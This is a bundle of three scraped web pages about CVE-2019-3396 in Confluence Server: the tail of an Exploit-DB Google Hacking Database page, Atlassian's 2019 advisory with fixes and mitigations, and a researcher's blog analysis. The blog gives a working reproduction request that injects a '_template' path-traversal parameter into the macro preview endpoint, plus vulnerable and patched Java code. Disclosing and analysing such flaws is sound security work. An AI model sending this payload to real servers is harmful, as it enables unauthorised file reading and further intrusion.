and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from confluence.atlassian.com_f4016f56_20250121_022934.html ===

![](/staticassets/4.7.2/dist/common/images/media-viewer-image-icon.svg)
##

![]()

Products
[# Confluence Support](https://support.atlassian.com/confluence/)

* [Documentation](/display/DOC/Confluence%2BData%2BCenter%2Bdocumentation)
* [Knowledge base](/display/CONFKB/Confluence%2BKnowledge%2BBase)
* Resources

* [Search](https://support.atlassian.com/search-results/)
* [Log in](https://id.atlassian.com/login?continue=https://confluence.atlassian.com/login.action?os_destination=/doc/confluence-security-advisory-2019-03-20-966660264.html)
* ![]()
  + [View account](https://my.atlassian.com/)
  + [View requests](https://support.atlassian.com/servicedesk/customer/user/requests)
  + [Log out](/logout.action?os_destination=https://id.atlassian.com/logout?continue=/doc/confluence-security-advisory-2019-03-20-966660264.html)
* ...

## [Knowledge base](/display/CONFKB/Confluence%2BKnowledge%2BBase)

## Products

* [### Jira Software

  Project and issue tracking](https://support.atlassian.com/jira-software-cloud)
* [### Jira Service Management

  Service management and customer support](https://support.atlassian.com/jira-service-management-cloud)
* [### Jira Work Management

  Manage any business project](https://support.atlassian.com/jira-work-management)
* [### Confluence

  Document collaboration](https://support.atlassian.com/confluence-cloud)
* [### Bitbucket

  Git code management](https://support.atlassian.com/bitbucket-cloud)

[See all](https://support.atlassian.com/products/)

## Resources

* [### Documentation

  Usage and admin help](/display/DOC/Confluence%2BData%2BCenter%2Bdocumentation)
* [### Community

  Answers, support, and inspiration](https://community.atlassian.com/t5/Confluence/ct-p/confluence)
* [### Suggestions and bugs

  Feature suggestions and bug reports](https://jira.atlassian.com/secure/Dashboard.jspa)
* [### Marketplace

  Product apps](https://marketplace.atlassian.com/search?hosting=server&product=confluence)
* [### Billing and licensing

  Frequently asked questions](https://www.atlassian.com/licensing/confluence)

* [Log out](/logout.action?os_destination=https://id.atlassian.com/logout?continue=/doc/confluence-security-advisory-2019-03-20-966660264.html)
* [Log in to account](https://id.atlassian.com/login?continue=https://confluence.atlassian.com/login.action?os_destination=/doc/confluence-security-advisory-2019-03-20-966660264.html)
* [Contact support](https://support.atlassian.com/contact/)
* [Training & Certification](https://www.atlassian.com/university)
* [Cloud Migration Center](https://www.atlassian.com/cloud-migration)
* [GDPR guides](https://confluence.atlassian.com/gdpr)
* [Enterprise services](https://www.atlassian.com/enterprise/services)
* [Atlassian partners](https://www.atlassian.com/partners)
* [Developers](https://developer.atlassian.com/)
* [User groups](http://aug.atlassian.com/)
* [Automation for Jira](https://confluence.atlassian.com/automation/)
* [Atlassian.com](http://www.atlassian.com/)

* #### Page
* [View in Confluence](/login.action?os_destination=%2Fpages%2Fviewpage.action%3FpageId%3D966660264)
* [Edit Page](/login.action?os_destination=https%3A%2F%2Fconfluence.atlassian.com%2Fpages%2Feditpage.action%3FpageId%3D966660264%26atl_token%3D41bb23523fc6313e5d2e1e3707cd19e2724e17b5)
* #### Viewport
* [Manage Viewport](/login.action?os_destination=%2Fspaces%2Fscroll-viewport%2Fconfig.action%3Fkey%3DDOC)
* #### Confluence
* [Dashboard](/login.action?os_destination=%2Fdashboard.action)
* [Space Directory](/login.action?os_destination=%2Fspacedirectory%2Fview.action)
* [People Directory](/login.action?os_destination=%2Fpeopledirectory.action)

![](/staticassets/4.7.2/dist/common/images/product-icons/confluence.svg)

[Confluence 9.2 (Latest)](/display/DOC/Confluence%2BData%2BCenter%2Bdocumentation)

Documentation

Unable to load

* [Atlassian Support](https://support.atlassian.com/ "Atlassian Support")
* [Confluence 9.2](https://support.atlassian.com/confluence/ "Confluence")
* [Documentation](/display/DOC/Confluence%2BData%2BCenter%2Bdocumentation "Confluence 9.2 (Latest)")
* [Confluence administrator's guide](/doc/confluence-administrator-s-guide-138143.html "Confluence administrator's guide")
* [Configuring Confluence Security](/doc/configuring-confluence-security-151515.html "Configuring Confluence Security")
* [Confluence Security Overview and Advisories](/doc/confluence-security-overview-and-advisories-134526.html "Confluence Security Overview and Advisories")
* [Confluence Security Advisory - 2019-03-20](/doc/confluence-security-advisory-2019-03-20-966660264.html "Confluence Security Advisory - 2019-03-20")

[Cloud](/display/ConfCloud/Confluence%2BCloud%2BDocumentation%2BHome)
Data Center 9.2
###### Versions

* 9.2
* [9.1](/display/CONF91/Confluence%2BData%2BCenter%2Bdocumentation)
* [9.0](/display/CONF90/Confluence%2BData%2BCenter%2Bdocumentation)
* [8.9](/display/CONF89/Confluence%2BData%2BCenter%2Bdocumentation)
* [8.8](/display/CONF88/Confluence%2BData%2BCenter%2Bdocumentation)
* [8.7](/display/CONF87/Confluence%2BData%2BCenter%2Bdocumentation)
* [8.6](/display/CONF86/Confluence%2BData%2BCenter%2Bdocumentation)
* [8.5](/display/CONF85/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [8.4](/display/CONF84/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [8.3](/display/CONF83/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [8.2](/display/CONF82/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [8.1](/display/CONF81/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [8.0](/display/CONF80/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [7.20](/display/CONF720/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [7.19](/display/CONF719/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [7.18](/display/CONF718/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [7.17](/display/CONF717/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [7.16](/display/CONF716/Confluence%2BData%2BCenter%2Band%2BServer%2Bdocumentation)
* [See all](/display/ALLDOC/Applications%2Band%2BTools%2BDocumentation%2BDirectory)

# Confluence Security Advisory - 2019-03-20

#### Confluence Security Overview and Advisories

* [Confluence Community Security Advisory 2006-01-19](/doc/confluence-community-security-advisory-2006-01-19-155489.html)
* [Confluence Security Advisory 2005-02-09](/doc/confluence-security-advisory-2005-02-09-115847.html)
* [Confluence Security Advisory 2005-12-05](/doc/confluence-security-advisory-2005-12-05-147063.html)
* [Confluence Security Advisory 2006-01-20](/doc/confluence-security-advisory-2006-01-20-156885.html)
* [Confluence Security Advisory 2006-01-23](/doc/confluence-security-advisory-2006-01-23-156888.html)
* [Confluence Security Advisory 2006-06-14](/doc/confluence-security-advisory-2006-06-14-176632.html)
* [Confluence Security Advisory 2007-07-26](/doc/confluence-security-advisory-2007-07-26-63996490.html)
* [Confluence Security Advisory 2007-08-08](/doc/confluence-security-advisory-2007-08-08-71599442.html)
* [Confluence Security Advisory 2007-11-19](/doc/confluence-security-advisory-2007-11-19-99713140.html)
* [Confluence Security Advisory 2007-11-27](/doc/confluence-security-advisory-2007-11-27-108363848.html)
* [Confluence Security Advisory 2007-12-14](/doc/confluence-security-advisory-2007-12-14-112853782.html)
* [Confluence Security Advisory 2008-01-24](/doc/confluence-security-advisory-2008-01-24-119800223.html)
* [Confluence Security Advisory 2008-03-06](/doc/confluence-security-advisory-2008-03-06-136183871.html)
* [Confluence Security Advisory 2008-03-19](/doc/confluence-security-advisory-2008-03-19-147128322.html)
* [Confluence Security Advisory 2008-05-21](/doc/confluence-security-advisory-2008-05-21-155813488.html)
* [Confluence Security Advisory 2008-07-03](/doc/confluence-security-advisory-2008-07-03-162431454.html)
* [Confluence Security Advisory 2008-09-08](/doc/confluence-security-advisory-2008-09-08-166529220.html)
* [Confluence Security Advisory 2008-10-14](/doc/confluence-security-advisory-2008-10-14-169117989.html)
* [Confluence Security Advisory 2008-12-03](/doc/confluence-security-advisory-2008-12-03-172458107.html)
* [Confluence Security Advisory 2009-01-07](/doc/confluence-security-advisory-2009-01-07-178258942.html)
* [Confluence Security Advisory 2009-02-18](/doc/confluence-security-advisory-2009-02-18-179446021.html)
* [Confluence Security Advisory 2009-04-15](/doc/confluence-security-advisory-2009-04-15-183074843.html)
* [Confluence Security Advisory 2009-06-01](/doc/confluence-security-advisory-2009-06-01-191501203.html)
* [Confluence Security Advisory 2009-06-16](/doc/confluence-security-advisory-2009-06-16-193301192.html)
* [Confluence Security Advisory 2009-08-20](/doc/confluence-security-advisory-2009-08-20-197298806.html)
* [Confluence Security Advisory 2009-10-06](/doc/confluence-security-advisory-2009-10-06-201851239.html)
* [Confluence Security Advisory 2009-12-08](/doc/confluence-security-advisory-2009-12-08-207489595.html)
* [Confluence Security Advisory 2010-05-04](/doc/confluence-security-advisory-2010-05-04-216433252.html)
* [Confluence Security Advisory 2010-06-02](/doc/confluence-security-advisory-2010-06-02-218273569.html)
* [Confluence Security Advisory 2010-07-06](/doc/confluence-security-advisory-2010-07-06-219023610.html)
* [Confluence Security Advisory 2010-08-17](/doc/confluence-security-advisory-2010-08-17-221448790.html)
* [Confluence Security Advisory 2010-09-21](/doc/confluence-security-advisory-2010-09-21-223216876.html)
* [Confluence Security Advisory 2010-10-12](/doc/confluence-security-advisory-2010-10-12-224398234.html)
* [Confluence Security Advisory 2010-11-15](/doc/confluence-security-advisory-2010-11-15-226166292.html)
* [Confluence Security Advisory 2011-01-18](/doc/confluence-security-advisory-2011-01-18-225117982.html)
* [Confluence Security Advisory 2011-03-24](/doc/confluence-security-advisory-2011-03-24-229834802.html)
* [Confluence Security Advisory 2011-05-31](/doc/confluence-security-advisory-2011-05-31-238617192.html)
* [Confluence Security Advisory 2012-05-17](/doc/confluence-security-advisory-2012-05-17-283641196.html)
* [Confluence Security Advisory 2012-09-04](/doc/confluence-security-advisory-2012-09-04-301662437.html)
* [Confluence Security Advisory 2012-09-11](/doc/confluence-security-advisory-2012-09-11-297667861.html)
* [Confluence Security Advisory 2013-08-05](/doc/confluence-security-advisory-2013-08-05-389775711.html)
* [Confluence Security Advisory 2014-02-26](/doc/confluence-security-advisory-2014-02-26-445188423.html)
* [Confluence Security Advisory 2014-05-21](/doc/confluence-security-advisory-2014-05-21-597557675.html)
* [Confluence Security Advisory - 2015-01-21](/doc/confluence-security-advisory-2015-01-21-702712783.html)
* [Confluence Security Advisory - 2016-09-21](/doc/confluence-security-advisory-2016-09-21-849052104.html)
* [Confluence Security Advisory - 2017-04-19](/doc/confluence-security-advisory-2017-04-19-887071137.html)
* [Confluence Security Advisory - 2019-03-20](/doc/confluence-security-advisory-2019-03-20-966660264.html)
* [Confluence Security Advisory - 2019-04-17](/doc/confluence-security-advisory-2019-04-17-968660855.html)
* [Confluence Security Advisory - 2019-08-28](/doc/confluence-security-advisory-2019-08-28-976161720.html)
* [Confluence Security Advisory - 2019-12-18](/doc/confluence-security-advisory-2019-12-18-982324349.html)
* [Confluence Security Advisory - 2021-08-25](/doc/confluence-security-advisory-2021-08-25-1077906215.html)
* [Multiple Products Security Advisory - Unrendered unicode bidirectional override characters - CVE-2021-42574 - 2021-11-01](/doc/multiple-products-security-advisory-unrendered-unicode-bidirectional-override-characters-cve-2021-42574-2021-11-01-1095762254.html)
* [Multiple Products Security Advisory - Hazelcast Vulnerable To Remote Code Execution - CVE-2016-10750](/doc/multiple-products-security-advisory-hazelcast-vulnerable-to-remote-code-execution-cve-2016-10750-1115678749.html)
* [Confluence Security Advisory 2022-06-02](/doc/confluence-security-advisory-2022-06-02-1130377146.html)
* [Questions For Confluence Security Advisory 2022-07-20](/doc/questions-for-confluence-security-advisory-2022-07-20-1142446709.html)

#### On this page

#### Related content

* No related content found

#### Still need help?

The Atlassian Community is here for you.

[Ask the community](https://community.atlassian.com/t5/custom/page/page-id/create-post-step-1?add-tags=Confluence)

## March 2019 Confluence Server Advisory - WebDAV and Widget Connector vulnerabilities

| Summary | March 2019 Confluence Server and Data Center Advisory - WebDAV and Widget Connector vulnerabilities |
| --- | --- |
| Advisory release date | 20 Mar 2019 10:00 AM PDT (Pacific Time, -7 hours) |
| Products | * Confluence Server * Confluence Data Center |
| Affected versions | * All 1.x.x, 2.x.x, 3.x.x, 4.x.x and 5.x.x versions * All 6.0.x, 6.1.x, 6.2.x, 6.3.x, 6.4.x, and 6.5.x versions * All 6.6.x versions before 6.6.12 * All 6.7.x, 6.8.x, 6.9.x, 6.10.x and 6.11.x versions * All 6.12.x versions before 6.12.3 * All 6.13.x versions before 6.13.3 * All 6.14.x versions before 6.14.2 |
| Fixed versions | * Version 6.6.12 and higher versions of 6.6.x * Version 6.12.3 and higher versions of 6.12.x * Version 6.13.3 and higher versions of 6.13.x * Version 6.14.2 and higher |
| CVE ID(s) | * CVE-2019-3395 * CVE-2019-3396 |

### **Summary of vulnerabilities**

This advisory discloses two **critical severity** security vulnerabilities in Confluence Server and Confluence Data Center.

| **Customers who have upgraded to Confluence Server or Data Center versions 6.6.12, 6.12.3, 6.13.3, 6.14.2 or higher are** **not affected.**  **Customers using Confluence Cloud are not affected.** |
| --- |

| **Customers who have downloaded and installed these versions of Confluence Server or Data Center are affected:**   * All 1.x.x, 2.x.x, 3.x.x, 4.x.x and 5.x.x versions * All 6.0.x, 6.1.x, 6.2.x, 6.3.x, 6.4.x, and 6.5.x versions * All 6.6.x versions before 6.6.12 * All 6.7.x, 6.8.x, 6.9.x, 6.10.x and 6.11.x versions * All 6.12.x versions before 6.12.3 * All 6.13.x versions before 6.13.3 * All 6.14.x versions before 6.14.2   Please **upgrade your** **Confluence Server or Data Center installations** **immediately** to fix this vulnerability. |
| --- |

### **WebDAV vulnerability - CVE-2019-3395**

#### **Severity**

Atlassian rates the severity level of this vulnerability as **critical**, according to the scale published in [our Atlassian severity levels](https://www.atlassian.com/security/security-severity-levels "https://www.atlassian.com/security/security-severity-levels"). The scale allows us to rank the severity as critical, high, moderate or low.

This is our assessment and you should evaluate its applicability to your own IT environment.

#### **Description**

Confluence Server and Data Center versions released before the 18th June 2018 are vulnerable to this issue. A remote attacker is able to exploit a Server-Side Request Forgery (SSRF) vulnerability in the WebDAV plugin to send arbitrary HTTP and WebDAV requests from a Confluence Server or Data Center instance.

All versions of Confluence Server and Confluence Data Center before version 6.6.7, from version 6.7.0 before 6.8.5 (the fixed version for 6.8.x), from version 6.9.0 before 6.9.3 (the fixed version for 6.9.x).

This issue can be tracked here:
[CONFSERVER-57971](https://jira.atlassian.com/browse/CONFSERVER-57971)
-
Getting issue details...
STATUS

#### Acknowledgements

Credit for finding this vulnerability goes to Shubham Shah from Assetnote ([https://assetnote.io](https://assetnote.io/ "https://assetnote.io")) and Orange Tsai from DEVCORE ([https://devco.re](https://devco.re/ "https://devco.re")).

### **Widget Connector vulnerability - CVE-2019-3396**

#### **Severity**

Atlassian rates the severity level of this vulnerability as **critical**, according to the scale published in [our Atlassian severity levels](https://www.atlassian.com/security/security-severity-levels "https://www.atlassian.com/security/security-severity-levels"). The scale allows us to rank the severity as critical, high, moderate or low.

This is our assessment and you should evaluate its applicability to your own IT environment.

#### **Description**

There was an server-side template injection vulnerability in Confluence Server and Data Center, in the Widget Connector. An attacker is able to exploit this issue to achieve server-side template injection, path traversal and remote code execution on systems that run a vulnerable version of Confluence Server or Data Center.

All versions of Confluence Server and Confluence Data Center before version 6.6.12, from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x) and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x).

This issue can be tracked here:
[CONFSERVER-57974](https://jira.atlassian.com/browse/CONFSERVER-57974)
-
Getting issue details...
STATUS

#### Acknowledgements

Credit for finding this vulnerability goes to Daniil Dmitriev ([https://twitter.com/ddv\_ua](https://twitter.com/ddv_ua "https://twitter.com/ddv_ua")).

---

### **Fix**

We have taken the following steps to address these issues:

* Released Confluence Server and Data Center versions 6.15.1 that contains fixes for these issues and can be be downloaded from [https://www.atlassian.com/software/confluence/download/](https://www.atlassian.com/software/confluence/download "https://www.atlassian.com/software/confluence/download") and [https://atlassian.com/software/confluence/download/data-center](https://atlassian.com/software/confluence/download/data-center "https://atlassian.com/software/confluence/download/data-center")
* Released Confluence Server and Data Center versions 6.6.12, 6.12.3, 6.13.3 and 6.14.2 that contains fixes for these issues and can be be downloaded from [https://www.atlassian.com/software/confluence/download-archives](https://www.atlassian.com/software/confluence/download-archives "https://www.atlassian.com/software/confluence/download-archives")

### **What you need to do**

Atlassian recommends that you upgrade to the latest version (6.15.1). For a full description of the latest version of Confluence Server and Data Center, see the [Release Notes](https://confluence.atlassian.com/doc/confluence-6-15-release-notes-965554120.html "https://confluence.atlassian.com/doc/confluence-6-15-release-notes-965554120.html"). You can download the latest version of Confluence from the [Atlassian website](https://www.atlassian.com/software/confluence/download "https://www.atlassian.com/software/confluence/download").

#### If you can’t upgrade to the latest version (6.15.1):

(1) If you have a **current feature version** (a feature version released on 4th October 2018 or later), upgrade to the **next bugfix version of your current feature version**.

| If you have feature version… | …then upgrade to this bugfix version: |
| --- | --- |
| 6.12.0, 6.12.1, 6.12.2 | 6.12.3 |
| 6.14.0, 6.14.1 | 6.14.2 |

(2) If you have a current **enterprise release version** (an enterprise release version released on 4th April 2017 or later), upgrade to the **latest version of your enterprise release version.**

| If you have enterprise release version… | …then upgrade to this version: |
| --- | --- |
| 6.6.0, 6.6.1, 6.6.2, 6.6.3, 6.6.4, 6.6.5, 6.6.6, 6.6.7, 6.6.8, 6.6.9, 6.6.10, 6.6.11 | 6.6.12 |
| 6.13.0, 6.13.1, 6.13.2 | 6.13.3 |

(3) If you have an older version (a feature version released before 4th October 2018, or an enterprise release version released before 4th April 2017), either upgrade to the **latest version of Confluence Server or Data Center**, or to the **latest version of an enterprise release version**.

| If you have older version… | …then upgrade to any of these versions: |
| --- | --- |
| 1.x.x  2.x.x  3.x.x  4.x.x  5.x.x  6.0.x, 6.1.x, 6.2.x, 6.3.x, 6.4.x, 6.5.x  6.7.x, 6.8.x, 6.9.x, 6.10.x, 6.11.x | 6.14.2  6.13.3  6.6.12 |

### **Mitigation**

If you are unable to upgrade Confluence immediately, then as a **temporary workaround**, you can go to **Administration** menu ![](/doc/files/747833194/747833195/2/1517274813281/cog.png) > **Manage apps / add-ons** select System, and disable the following system plugins in Confluence:

* WebDAV plugin
* Widget Connector

If you disable the Widget Connector plugin, the [Widget Connector macro](/doc/widget-connector-macro-171180449.html) will not be available. This macro is used to display content from websites like YouTube, Vimeo, and Twitter. Users will see an 'unknown macro' error.

If you disable the WebDAV plugin, you will not be able to connect to Confluence using a [WebDAV client](/doc/use-a-webdav-client-to-work-with-pages-200704169.html). Disabling this plugin will also automatically disable the [Office Connector](/doc/configuring-the-office-connector-170492758.html) plugin, which means Office Connector features such as [Import from Word](/doc/import-a-word-document-into-confluence-170493136.html), and [Edit in Office](/conf610/edit-office-files-952622479.html) will not be available. Note that because WebDAV is not required to [edit files](/doc/edit-files-170494553.html) from Confluence 6.11 and later, you will still be able to edit files in those versions.

After upgrading, you will need to manually re-enable:

* WebDAV plugin
* Widget Connector
* Office Connector.

### **Support**

If you did not receive an email for this advisory and you wish to receive such emails in the future go to [https://my.atlassian.com/email](https://my.atlassian.com/email "https://my.atlassian.com/email") and subscribe to Alerts emails.

If you have questions or concerns regarding this advisory, please raise a support request at [https://support.atlassian.com/](https://support.atlassian.com/ "https://support.atlassian.com/").

### **References**

| [Security Bugfix Policy](https://www.atlassian.com/trust/security/bug-fix-policy "https://www.atlassian.com/trust/security/bug-fix-policy") | Our SLAs and guarantees for bugfixes. |
| --- | --- |
| [Severity Levels for security issues](https://www.atlassian.com/security/security-severity-levels "https://www.atlassian.com/security/security-severity-levels") | Atlassian security advisories include a severity level and a CVE identifier. This severity level is based on our self-calculated CVSS score for each specific vulnerability. CVSS is an industry standard vulnerability metric. You can also learn more about CVSS at [FIRST.org](http://first.org/ "http://FIRST.org"). |
| [End of Life Policy](https://confluence.atlassian.com/support/atlassian-support-end-of-life-policy-201851003.html "https://confluence.atlassian.com/support/atlassian-support-end-of-life-policy-201851003.html") | Our end of life policy varies for different products. Please refer to the policy for details. |

Last modified on Apr 3, 2019

Was this helpful?

Yes
No
 It wasn't accurate

 It wasn't clear

 It wasn't relevant

Provide feedback about this article

#### Related content

* No related content found

Powered by [Confluence](http://www.atlassian.com/) and [Scroll Viewport](https://www.k15t.com/go/scroll-viewport).

[Atlassian](https://www.atlassian.com/)

* [Notice at Collection](https://www.atlassian.com/legal/privacy-policy#additional-disclosures-for-ca-residents)
* [Privacy Policy](https://www.atlassian.com/legal/privacy-policy)
* [Terms of Use](https://www.atlassian.com/legal/customer-agreement)
* [Security](https://www.atlassian.com/trust/security)
* ©  Atlassian



=== Content from chybeta.github.io_143b55a0_20250121_022932.html ===


[Chybeta](/)

* [首页](/)
* [归档](/archives)
* [分类](/categories)
* [标签](/tags)
* [朋友](/link)
* [关于我](/about)
* 搜索

close

![Chybeta]()

# 【CVE-2019-3396】:SSTI and RCE in Confluence Server via Widget Connector

发表于
2019-04-06

|

分类于
[Web Security](/categories/Web-Security/)

|

阅读次数

![](https://xzfile.aliyuncs.com/media/upload/picture/20210805230907-147e9e28-f5ff-1.png)

[Twitter: chybeta](https://twitter.com/chybeta)

# Security Advisory

<https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html>

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190406/1.jpg?raw=true)

# Analysis

According to the [document](https://confluence.atlassian.com/doc/widget-connector-macro-171180449.html) , there are three parameters that you can set to control the content or format of the macro output, including URL、Width and Height.

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190406/2.png?raw=true)

the `Widget Connector` has defind some renders. for example the `FriendFeedRenderer`:

| ``` 123456789 ``` | ``` public class FriendFeedRenderer implements WidgetRenderer{  ...    public String getEmbeddedHtml(String url, Map<String, String> params) {    params.put("_template", "com/atlassian/confluence/extra/widgetconnector/templates/simplejscript.vm");    return this.velocityRenderService.render(getEmbedUrl(url), params);  }} ``` |
| --- | --- |

In `FriendFeedRenderer`‘s `getEmbeddedHtml` function , you will see they put another option `_template` into params map.

However, some other renderers, such as in `video` category , just call `render(getEmbedUrl(url), params)` directly
![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190406/3.png?raw=true)

So in this situation, we can `"offer"` the `_template` ourseleves which the backend will use the params to render

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190406/4.png?raw=true)

# Reproduce

| ``` 123 ``` | ``` POST /rest/tinymce/1/macro/preview HTTP/1.1{"contentId":"65601","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"../web.xml"},"body":""}} ``` |
| --- | --- |

![](https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20190406/5.jpg)

# RCE

# Patch

in fix version, it will call `doSanitizeParameters` before render html which will remove the `_template` in parameters. The code may like this:

| ``` 123456789101112131415161718192021222324252627 ``` | ``` public class WidgetMacro  extends BaseMacro  implements Macro, EditorImagePlaceholder{  public WidgetMacro(RenderManager renderManager, LocaleManager localeManager, I18NBeanFactory i18NBeanFactory)  {    ...    this.sanitizeFields = Collections.unmodifiableList(Arrays.asList(new String[] { "_template" }));  }    ...  public String execute(Map<String, String> parameters, String body, ConversionContext conversionContext) {    ...    doSanitizeParameters(parameters);        return this.renderManager.getEmbeddedHtml(url, parameters);  }    private void doSanitizeParameters(Map<String, String> parameters)  {    Objects.requireNonNull(parameters);    for (String sanitizedParameter : this.sanitizeFields) {      parameters.remove(sanitizedParameter);    }  }} ``` |
| --- | --- |

微信扫码加入知识星球【漏洞百出】
![chybeta WeChat Pay](https://xzfile.aliyuncs.com/media/upload/picture/20210805230907-147e9e28-f5ff-1.png)

本文标题:[【CVE-2019-3396】:SSTI and RCE in Confluence Server via Widget Connector](/2019/04/06/Analysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/)

文章作者:[chybeta](/ "访问 chybeta 的个人博客")

发布时间:2019年04月06日 - 13:04

最后更新:2019年04月08日 - 17:04

原始链接:[http://chybeta.github.io/2019/04/06/Analysis-for-【CVE-2019-3396】-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/](/2019/04/06/Analysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/ "【CVE-2019-3396】:SSTI and RCE in Confluence Server via Widget Connector")

